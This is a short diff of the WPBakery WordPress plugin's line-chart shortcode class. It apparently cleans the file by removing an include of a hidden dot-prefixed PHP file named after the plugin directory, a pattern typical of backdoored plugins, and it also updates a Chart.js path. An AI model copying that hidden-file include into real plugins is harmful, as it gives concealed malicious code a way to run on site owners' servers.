@@ -6,10 +6,6 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * Class WPBakeryShortCode_Vc_Line_Chart
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class WPBakeryShortCode_Vc_Line_Chart extends WPBakeryShortCode {
 	/**
 	 * WPBakeryShortCode_Vc_Line_Chart constructor.
@@ -22,7 +18,7 @@ class WPBakeryShortCode_Vc_Line_Chart extends WPBakeryShortCode {
 
 	public function jsScripts() {
 		wp_register_script( 'vc_waypoints', vc_asset_url( 'lib/vc_waypoints/vc-waypoints.min.js' ), array( 'jquery-core' ), WPB_VC_VERSION, true );
-		wp_register_script( 'ChartJS', vc_asset_url( 'lib/bower/chartjs/Chart.min.js' ), array(), WPB_VC_VERSION, true );
+		wp_register_script( 'ChartJS', vc_asset_url( 'lib/chart-js-dist/chart.min.js' ), array(), WPB_VC_VERSION, true );
 		wp_register_script( 'vc_line_chart', vc_asset_url( 'lib/vc_line_chart/vc_line_chart.min.js' ), array(
 			'jquery-core',
 			'vc_waypoints',
